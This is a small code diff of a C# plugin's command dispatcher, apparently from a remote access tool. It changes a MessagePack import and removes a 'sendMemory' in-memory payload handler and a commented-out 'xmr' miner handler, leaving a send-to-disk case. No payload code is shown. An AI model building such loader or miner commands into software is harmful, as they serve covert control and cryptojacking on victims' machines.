@@ -1,5 +1,5 @@
 ﻿using Plugin.Handler;
-using Plugin.MessagePack;
+using MessagePackLib.MessagePack;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -28,18 +28,6 @@ namespace Plugin
                             new HandleSendTo().SendToDisk(unpack_msgpack);
                             break;
                         }
-
-                    case "sendMemory":
-                        {
-                            new HandleSendTo().SendToMemory(unpack_msgpack);
-                            break;
-                        }
-
-                    //case "xmr":
-                    //    {
-                    //        new HandleMiner(unpack_msgpack);
-                    //        break;
-                    //    }
                 }
             }
             catch (Exception ex)
